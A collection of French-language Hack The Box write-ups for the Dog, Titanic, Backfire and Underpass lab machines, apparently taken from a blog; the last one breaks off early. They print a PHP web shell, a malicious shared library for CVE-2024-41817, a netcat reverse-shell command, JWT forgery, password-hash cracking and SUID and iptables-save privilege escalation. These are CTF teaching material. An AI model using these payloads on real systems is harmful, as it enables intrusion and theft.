[{"content":"Résumé User: Identifiants de l\u0026rsquo;app web dans le code source extrait via GitHack + RCE via l\u0026rsquo;upload d\u0026rsquo;une archive.\nRoot: Misconfiguration sudo du CLI bee.\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, nous pouvons identifier un service web sur le port 80 et SSH sur le port 22.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -Pn -p- 10.129.208.97 -v -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) |_ 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries (15 shown) | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply |_http-generator: Backdrop CMS 1 (https://backdropcms.org) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 |_http-server-header: Apache/2.4.41 (Ubuntu) | http-git: | 10.129.208.97:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... Utilisateur Dump git + RCE via shell.tar Le scan nmap a souligné que le dossier .git de l\u0026rsquo;application web est exposé.\nNous utilisons GitHack afin d\u0026rsquo;obtenir une partie du code source.\n1 2 3 4 5 6 7 8 9 $ ls GitHack.py index lib README.md $ python GitHack.py http://dog.htb/.git [+] Download and parse index file ... [+] LICENSE.txt [+] README.md [+] core/.jshintignore ... Dans ces fichiers, nous pouvons trouver un username tiffany et un mot de passe BackDropJ2024DS2024 1 2 3 4 5 6 7 $ grep -ir dog.htb . ./dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \u0026#34;tiffany@dog.htb\u0026#34; $ cat -n settings.php ... 15 $database = \u0026#39;mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop\u0026#39;; ... Ces identifiants nous permettent de nous connecter à l\u0026rsquo;application web http://dog.htb en tant que tiffany.\nNous pouvons trouver la version de Backdrop utilisée via l\u0026rsquo;onglet Reports puis Status report.\nCette version 1.27.1 est vulnérable à une RCE. Cet exploit pourrait fonctionner mais, notre instance de backdrop n\u0026rsquo;autorise pas l\u0026rsquo;installation de modules en utilisant des archives .zip.\nNous pouvons trouver cette information via l\u0026rsquo;onget Functionality puis Install new modules. Nous allons créer notre propre archive .tar en utilisant le code HTML/PHP et contenu de shell.info fournis dans l\u0026rsquo;exploit.\nEnsuite, sur la page d\u0026rsquo;installation des modules, nous uploadons notre archive. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ cat shell.php \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; autofocus id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ cat shell.info type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 $ tar cvf shell.tar shell.php shell.info shell.php shell.info Même si notre nouveau module n\u0026rsquo;est pas listé dans la liste des modules de l\u0026rsquo;application web, nous pouvons y accéder via /modules/shell/shell.php comme spécifié dans l\u0026rsquo;exploit. Dans le dossier /home, on remarque deux utilisateurs jobert et johncusack. En réutilisant le mot de passe BackDropJ2024DS2024 précédemment trouvé, nous pouvons nous connecter à la machine via SSH en tant que johncusack et récupérer le flag user.txt. 1 2 3 $ ssh johncusack@dog.htb johncusack@dog:~$ ls user.txt Root Misconfiguration sudo On remarque que johncusack peut utiliser la CLI bee en tant que root grace à sudo. 1 2 3 4 5 6 7 johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee Cette CLI \u0026ldquo;permet aux developpeurs d\u0026rsquo;intérargir avec des sites Backdrop\u0026rdquo; comme spécifié sur leur GitHub. Comme indiqué dans la documentation, nous pouvons éxécuter du code PHP.\n1 2 3 4 5 6 johncusack@dog:~$ sudo bee ... eval ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. ... Premièrement, nous allons nous déplacer dans /var/www/html pour que bee puisse intérargir avec notre application backdrop.\nEnsuite, nous allons ajouter le flag SUID à /bin/bash afin d\u0026rsquo;obtenir un shell root et récupérer le flag root.txt. 1 2 3 4 5 6 7 8 9 johncusack@dog:~$ cd /var/www/html johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee php-eval \u0026#39;exec(\u0026#34;chmod u+s /bin/bash\u0026#34;)\u0026#39; johncusack@dog:/var/www/html$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash johncusack@dog:/var/www/html$ /bin/bash -p bash-5.0# id uid=1001(johncusack) gid=1001(johncusack) euid=0(root) groups=1001(johncusack) bash-5.0# ls /root root.txt Ressources GitHack\nRCE exploit - Backdrop v1.27.1\n","date":"2025-07-12T00:00:00Z","image":"https://01MI.github.io/p/dog-htb-writeup-linux-easy/Dog_hu_2652b157db0b587e.PNG","permalink":"https://01MI.github.io/fr/p/dog-htb-writeup-linux-easy/","title":"Dog - Linux Easy - HTB Writeup"},{"content":"Résumé User: Path traversal\nRoot: Execution de code arbitraire via CVE-2024-41817(ImageMagick).\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, nous pouvons identifier un service web sur le port 80 et SSH sur le port 22.\n1 2 3 4 5 6 7 8 9 10 11 $ nmap -Pn -p 80,22 10.129.175.139 -v -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA) |_ 256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://titanic.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Utilisateur Path traversal En explorant titanic.htb, on remarque que si l\u0026rsquo;on soumet le formulaire de booking, un fichier contenant nos éléments de réservation au format JSON est téléchargé.\n1 2 3 4 5 6 7 8 $ cat 5a41afb2-469c-4d75-8faf-4c1b70d398be.json | jq . { \u0026#34;name\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;test@test.com\u0026#34;, \u0026#34;phone\u0026#34;: \u0026#34;test-01\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2025-06-18\u0026#34;, \u0026#34;cabin\u0026#34;: \u0026#34;Deluxe\u0026#34; } Côté burp, le paramètre ticket via /download permet de spécifier le fichier à télécharger.\nL\u0026rsquo;absence de controle ou de validation sur ce paramètre nous permet de lire des fichiers sur la machine.\nCe path traversal, nous permet de récupérer les informations suivantes:\n/etc/passwd nous indique l\u0026rsquo;existence de l\u0026rsquo;utilisateur developer.\n/etc/hosts nous permet de récupérer un nouveau sous-domaine, dev. Gitea Pour l\u0026rsquo;instant, on ne peut pas aller plus loin, explorons dev.titanic.htb.\nOn trouve une instance de Gitea, un outil de versionning auto-herbergé utilisant git.\nEn explorant les repo accessibles publiquement, on trouve docker-configet flask-app.\nDans le repo docker-config, on trouve des identifiants MySQL dans /mysql/docker-compose.yml.\nLe scan nmap n\u0026rsquo;a pas permis d\u0026rsquo;identifier un accès MySQL, on garde ces identifiants de côté.\nToujours dans ce même repository, on trouve dans /gitea/docker-compose.yml, le chemin vers un volume.\nEn utilisant ce chemin, le path traversal précédemment trouvé et la documentation de Gitea, on peut récupérer le fichier de configuration de Gitea.\nAprès plusieurs tentatives, il se situe dans /home/developer/gitea/data/gitea/conf/app.ini.\nDans ce fichier de conf, on trouve le chemin de la BDD Gitea.\nOn passe par le site pour la récupérer.\nEn explorant cette base de données avec sqlite3, on peut récupérer les hash de developer et administrator.\n1 2 3 4 5 $ sqlite3 gitea.db ... sqlite\u0026gt; select * from user; 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0 Les hashs sont au format PBKDF2 et peuvent être convertis à l’aide de gitea2hashcat.py pour être compatibles avec Hashcat et ensuite casser le mot de passe du compte developer. 1 2 3 4 5 6 7 8 $ sqlite3 gitea.db \u0026#39;select salt,passwd from user;\u0026#39; | ./gitea2hashcat.py [+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256) sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY= sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y= $ hashcat -a 0 -m 10900 hash /usr/share/wordlists/rockyou.txt ... sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528 On l\u0026rsquo;utilise pour se connecter via SSH à la machine. 1 2 3 4 5 6 $ ssh developer@titanic.htb ... developer@titanic:~$ ls gitea mysql user.txt developer@titanic:~$ cat user.txt e85d89a008cff72094f40882eb2f7d9b Root CVE-2024-41817(ImageMagick) Une fois connecté en SSH, on remarque le script identify_images.sh dans le dossier /opt/scripts/. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 developer@titanic:/opt$ tree . . ├── app │ ├── app.py │ ├── static │ │ ├── assets │ │ │ └── images │ │ │ ├── entertainment.jpg │ │ │ ├── exquisite-dining.jpg │ │ │ ├── favicon.ico │ │ │ ├── home.jpg │ │ │ ├── luxury-cabins.jpg │ │ │ └── metadata.log │ │ └── styles.css │ ├── templates │ │ └── index.html │ └── tickets ├── containerd [error opening dir] └── scripts └── identify_images.sh 8 directories, 10 files developer@titanic:/opt$ cat scripts/identify_images.sh cd /opt/app/static/assets/images truncate -s 0 metadata.log find /opt/app/static/assets/images/ -type f -name \u0026#34;*.jpg\u0026#34; | xargs /usr/bin/magick identify \u0026gt;\u0026gt; metadata.log Cette commande va identifier le format et caractéristiques des fichiers finissant par .jpg dans /opt/app/static/assets/images/ et les stocker dans /opt/app/static/assets/metadata.log.\nOn remarque que le timestamp de metadata.log est actualisé chaque minute, le script appartient à root donc susceptible d\u0026rsquo;être lancé par une tâche cron.\nLes commandes truncate, find, xargs ne sont pas exploitables ici. Imagemagick étant un outil utilisé dans des CTF dans ses versions vulnérables, on cherche des CVE associées à sa version, la 7.1.1-35. 1 2 3 developer@titanic:~$ magick --version Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org ... On trouve cet advisory sur Github concernant la CVE-2024-41817 permettant une execution de code arbitraire sur les versions \u0026lt;= à 7.1.1-35.\nPour obtenir de l\u0026rsquo;éxécution de code en tant que root, on va adapter le POC mentionné en modifiant id pour set le SUID sur /bin/bash. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 developer@titanic:/tmp$ cat libxcb #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__((constructor)) void init(){ system(\u0026#34;chmod +s /bin/bash\u0026#34;); exit(0); } developer@titanic:/tmp$ gcc -x c -shared libxcb.c -fPIC -o ./libxcb.so.1 developer@titanic:/tmp$ mv libxcb.so.1 /opt/app/static/assets/images/ developer@titanic:/tmp$ ls -ld /bin/bash -rwsr-sr-x 1 root root 1396520 Mar 14 2024 /bin/bash developer@titanic:/tmp$ bash -p bash-5.1# id uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer) bash-5.1# ls /root cleanup.sh images revert.sh root.txt snap Ressources gitea2hashcat.py\nAdvisory Github for CVE-2024-41817\n","date":"2025-06-21T00:00:00Z","image":"https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic_hu_1050c0167f506c80.PNG","permalink":"https://01MI.github.io/fr/p/titanic-htb-writeup-linux-easy/","title":"Titanic - Linux Easy - HTB Writeup"},{"content":"Résumé User Ilya: Exploit Havoc C2: SSRF + RCE\nLateral mouvement vers Sergej: Exploit HardHat C2: Authentification bypass + RCE\nRoot: Défaut de configuration sudo\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, nous pouvons identifier deux services web, celui accessible sur le port 8000 retiendra notre attention ici.\n1 2 3 4 5 6 7 8 $ nmap 10.10.11.49 -Pn -v PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 5000/tcp filtered upnp 7096/tcp filtered unknown 8000/tcp open http-alt User Ilya Exploit Havoc C2: SRF + RCE Un directory listing accessible via le port 8000 nous permet de récupérer deux fichiers:\ndisable.tls.patch: Il nous indique que TLS est désactivé pour le port 40056 permettant ainsi une connexion non sécurisée via WebSocket. havoc.yaotl: Un fichier de configuration pour le framework C2 Havoc. Ces fichiers suggèrent que l\u0026rsquo;exploitation reposera sur une ou plusieurs vulnérabilités liées à un serveur de commande et contrôle (C2) Havoc.\nAprès quelques recherches, on tombe sur cet exploit: https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE\nCet exploit combine deux vulnérabilités:\nla CVE-2024-41570, qui permet d’exploiter une faille SSRF pour ouvrir un socket TCP sur le serveur principal (teamserver) et d’y lire ou écrire des données. une injection de commandes autorisant un utilisateur authentifié à exécuter des commandes sur ce même serveur. Une fois l\u0026rsquo;installation du framework Havoc éffectuée, on lance le serveur et le client: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ ./havoc server --verbose --debug --profile /home/kali/Téléchargements/havoc.yaotl _______ _______ _______ │\\ /│( ___ )│\\ /│( ___ )( ____ \\ │ ) ( ││ ( ) ││ ) ( ││ ( ) ││ ( \\/ │ (___) ││ (___) ││ │ │ ││ │ │ ││ │ │ ___ ││ ___ │( ( ) )│ │ │ ││ │ │ ( ) ││ ( ) │ \\ \\_/ / │ │ │ ││ │ │ ) ( ││ ) ( │ \\ / │ (___) ││ (____/\\ │/ \\││/ \\│ \\_/ (_______)(_______/ pwn and elevate until it\u0026#39;s done [12:47:51] [DBUG] [cmd.init.func2:59]: Debug mode enabled [12:47:51] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust] [12:47:51] [INFO] Havoc profile: /home/kali/Téléchargements/havoc.yaotl [12:47:51] [INFO] Build: - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc - Nasm : /usr/bin/nasm [12:47:51] [INFO] Time: 04/06/2025 12:47:51 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ./havoc client _______ _______ _______ │\\ /│( ___ )│\\ /│( ___ )( ____ \\ │ ) ( ││ ( ) ││ ) ( ││ ( ) ││ ( \\/ │ (___) ││ (___) ││ │ │ ││ │ │ ││ │ │ ___ ││ ___ │( ( ) )│ │ │ ││ │ │ ( ) ││ ( ) │ \\ \\_/ / │ │ │ ││ │ │ ) ( ││ ) ( │ \\ / │ (___) ││ (____/\\ │/ \\││/ \\│ \\_/ (_______)(_______/ pwn and elevate until it\u0026#39;s done [12:47:53] [info] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust] [12:47:53] [info] loaded config file: client/config.toml [12:47:54] [info] Connecting to profile: HTB \u0026lt;string\u0026gt;:114: SyntaxWarning: invalid escape sequence \u0026#39;\\W\u0026#39; [12:47:54] [info] Started \u0026#34;Demon Listener\u0026#34; listener On lance l\u0026rsquo;exploit en utilisant le compte d\u0026rsquo;Ilya récupéré dans le fichier havoc.yaotl et on exécute la commande suivante afin d\u0026rsquo;obtenir un reverse shell sur le serveur: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ python3 CVE-2024-41570.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P \u0026#39;CobaltStr1keSuckz!\u0026#39; [***] Trying to register agent... [***] Success! [***] Trying to open socket on the teamserver... [***] Success! [***] Trying to write to the socket [***] Success! [***] Trying to poll teamserver for socket output... [***] Read socket output successfully! ... Enter command to execute: busybox nc 10.10.14.173 80 -e sh [***] Trying to write to the socket [***] Success! [***] Trying to poll teamserver for socket output... [***] Read socket output successfully! Le reverse shell obtenu n\u0026rsquo;étant pas stable et se coupant rapidement, on ajoute notre clé ssh dans le fichier de clés autorisées du compte d\u0026rsquo;Ilya. 1 2 3 4 5 6 7 $ nc -lvnp 80 listening on [any] 80 ... connect to [10.10.14.173] from (UNKNOWN) [10.10.11.49] 60884 echo \u0026#34;ssh-ed25519 A...k kali@kali\u0026#34; \u0026gt;\u0026gt; /home/ilya/.ssh/authorized_keys cat /home/ilya/.ssh/authorized_keys ... ssh-ed25519 A...k kali@kali On se connecte via SSH et on récupère le flag user. 1 2 3 4 5 6 $ ssh -i ~/.ssh/id_ed25519 ilya@10.10.11.49 ... ilya@backfire:~$ ls files hardhat.txt Havoc user.txt ilya@backfire:~$ cat user.txt b961[...]016b Lateral mouvement: Sergej Exploit HardHat C2: Authentification bypass + RCE Dans le home d\u0026rsquo;Ilya, on remarque le fichier hardhat.txt suivant:\n1 2 3 4 5 ilya@backfire:~$ ls files hardhat.txt Havoc user.txt ilya@backfire:~$ cat hardhat.txt Sergej said he installed HardHatC2 for testing and not made any changes to the defaults I hope he prefers Havoc bcoz I don\u0026#39;t wanna learn another C2 framework, also Go \u0026gt; C# En observant les ports en écoute, on a bien la confirmation qu\u0026rsquo;une instance de HardHat, un autre C2, est présent sur le serveur:\n1 2 3 4 5 6 7 8 9 10 11 ilya@backfire:~$ netstat -planetu .. Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 1001 50679 - tcp 0 0 0.0.0.0:7096 0.0.0.0:* LISTEN 1001 51911 - tcp 0 0 127.0.0.1:40056 0.0.0.0:* LISTEN 1000 54307 - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN 0 21679 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 22673 - tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 0 21680 - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN 1000 53569 - [...] Puisque Sergej n\u0026rsquo;a apporté aucun changement à la configuration par défaut du C2, nous allons nous baser sur l\u0026rsquo;article suivant afin de compromettre son compte: https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7\nPlus précisément, on s\u0026rsquo;intéresse aux vulnérabilités 2 et 3.\nLa première vulnérabilité permettant de contourner l\u0026rsquo;authentification exploite le fait que HardHat utilise une clé statique pour signer les JWTs, ce qui nous permet de créer des jetons d\u0026rsquo;authentification pour n\u0026rsquo;importe quel rôle.\nOn forward alors le port 5000 afin d\u0026rsquo;utiliser le script fourni dans l\u0026rsquo;article et créer un nouvel utilisateur ayant le rôle de TeamLead. 1 ssh -L 5000:localhost:5000 ilya@10.10.11.49 Dans le script récupéré, on modifie le paramètre rhost pour rhost: = 'localhost:5000' et on crée notre nouvel utilisateur. 1 2 3 4 5 6 $ python3 ./exploit.py ... Generated JWT: ey...oH6CDUNc ... User sth_pentest created Maintenant que notre utilisateur est crée, nous allons exploiter la seconde vulnérabilité afin d\u0026rsquo;obtenir de l\u0026rsquo;éxecution de code via l\u0026rsquo;interface de HardHat accessible sur le port 7096.\nDans un premier temps, on forward ce port et se connecte avec notre utilisateur stj_pentest.\n1 $ ssh -L 7096:localhost:7096 ilya@10.10.11.49 Ensuite, on va accéder à la page ImplantInteract afin d\u0026rsquo;utiliser la console intégrée.\nOn constate bien que les commandes sont exécutées en tant que Sergej, on va ajouter notre clé publique dans les clés autorisées de ce compte afin de pouvoir nous y connecter via SSH.\nRoot Défaut de configuration lié à sudo Une fois connecté en SSH, on remarque un défaut de configuration lié à sudo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ssh -i ~/.ssh/id_ed25519 sergej@10.10.11.49 Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64 sergej@backfire:~$ ls HardHatC2 hardhat_firewall.sh sergej@backfire:~$ cat hardhat_firewall.sh #!/bin/bash #sudo /usr/sbin/iptables-save \u0026gt; /tmp/rules.v4 sudo /usr/sbin/iptables -F sudo /usr/sbin/iptables -A INPUT -p tcp -s localhost --dport 5000 -j ACCEPT sudo /usr/sbin/iptables -A INPUT -p tcp --dport 5000 -j REJECT sudo /usr/sbin/iptables -A INPUT -p tcp -s localhost --dport 7096 -j ACCEPT sudo /usr/sbin/iptables -A INPUT -p tcp --dport 7096 -j REJECT sergej@backfire:~$ sudo -l Matching Defaults entries for sergej on backfire: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User sergej may run the following commands on backfire: (root) NOPASSWD: /usr/sbin/iptables (root) NOPASSWD: /usr/sbin/iptables-save On va s\u0026rsquo;appuyer sur l\u0026rsquo;article suivant afin d\u0026rsquo;élever nos privilèges: https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/\nIci, la conservation des retours à la ligne dans les commentaires d\u0026rsquo;iptables va nous permettre d\u0026rsquo;écrire dans un fichier arbitaire via iptables-save.\nDonc, nous allons écraser le fichier des clés publiques autorisées par root afin d\u0026rsquo;y ajouter la notre.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sergej@backfire:~$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $\u0026#39;\\nssh-ed25519 AA...Dk kali@kali\\n\u0026#39; sergej@backfire:~$ sudo iptables -S -P INPUT ACCEPT -P FORWARD ACCEPT -P OUTPUT ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT -A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT -A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable -A INPUT -i lo -m comment --comment \u0026#34; ssh-ed25519 AA...Dk kali@kali \u0026#34; -j ACCEPT sergej@backfire:~$ sudo iptables-save -f /root/.ssh/authorized_keys Nous pouvons maintenant accéder à la machine en tant que root via SSH.\n1 2 3 4 5 $ ssh -i ~/.ssh/id_ed25519 root@10.10.11.49 root@backfire:~# ls root.txt root@backfire:~# cat root.txt a7b6[...]174e Ressources Repo Github du framework Havoc C2\nRepo Github de l\u0026rsquo;exploit SSRF + RCE Havoc C2\nArticle Medium pour l\u0026rsquo;exploit du HardHat C2\nArticle permettant d\u0026rsquo;exploiter iptables et iptables-save via le défaut de configuration sudo\n","date":"2025-06-07T00:00:00Z","image":"https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire_hu_e6f6f2a7cc70aa3e.PNG","permalink":"https://01MI.github.io/fr/p/backfire-htb-writeup-linux-medium/","title":"Backfire - Linux Medium - HTB Writeup"},{"content":"Résumé User: Identifiants par défaut + réutilisation d\u0026rsquo;un mot de passe faible\nRoot: Sudo Privilege escalation\nEnumeration A l\u0026rsquo;aide d\u0026rsquo;un scan nmap, nous pouvons identifier qu\u0026rsquo;un service SSH et web sont exposés. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ nmap -Pn -p- 10.10.11.48 -A -v PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA) |_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.52 (Ubuntu) 7294/tcp filtered unknown 12945/tcp filtered unknown 37517/tcp filtered unknown 39220/tcp filtered unknown 44459/tcp filtered unknown 55246/tcp filtered unknown 55628/tcp filtered unknown 64827/tcp filtered unknown Utilisateur Fuzzing En utilisant ffuf pour effectuer du fuzzing de répertoires sur le port 80, on découvre le chemin /daloradius/app/operators.\nEn accédant à ce chemin, nous sommes redirigés vers une page de connexion liée à Daloradius, une \u0026ldquo;plateforme RADIUS web avancée destinée à la gestion de hotspots et de déploiements SP génériques\u0026rdquo;. 1 2 3 4 5 6 7 8 9 10 11 $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/FUZZ daloradius [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 15ms] \u0026lt;...\u0026gt; $ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.48/daloradius/FUZZ app [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 15ms] \u0026lt;...\u0026gt; $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.48/daloradius/app/FUZZ operators [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 87ms] \u0026lt;...\u0026gt; Chemin: http://10.10.11.48/daloradius/app/operators/login.php Identifiants par défaut En utilisant les identifiants par défaut administrator:radius, facilement trouvables sur internet, on accède à la page d\u0026rsquo;accueil de Daloradius.\nDepuis cette interface, nous pouvons accéder à la page users et utiliser hashcat pour trouver le mot de passe de svcMosh qui s\u0026rsquo;apparente à un hash MD5. 1 2 3 4 $ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt \u0026lt;...\u0026gt; 412dd4759978acfcc81deab01b382403:underwaterfriends \u0026lt;...\u0026gt; Grâce à ces identifiants, on accède au serveur en tant qu\u0026rsquo;utilisateur svcMosh. 1 2 3 4 5 6 $ ssh svcMosh@10.10.11.48 \u0026lt;...\u0026gt; svcMosh@underpass:~$ pwd /home/svcMosh svcMosh@underpass:~$ ls user.txt Root Sudo Privilege escalation L\u0026rsquo;utilisateur svcMosh est autorisé à éxécuté mosh-server via sudo, un composant de Mosh, shell distant conçu pour des sessions interactives similaires à SSH.\nComme cette commande peut être exécutée via sudo, nous pouvons l’utiliser pour obtenir un shell avec les privilèges root. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 svcMosh@underpass:~$ sudo -l Matching Defaults entries for svcMosh on localhost: env_reset, mail_badpass, 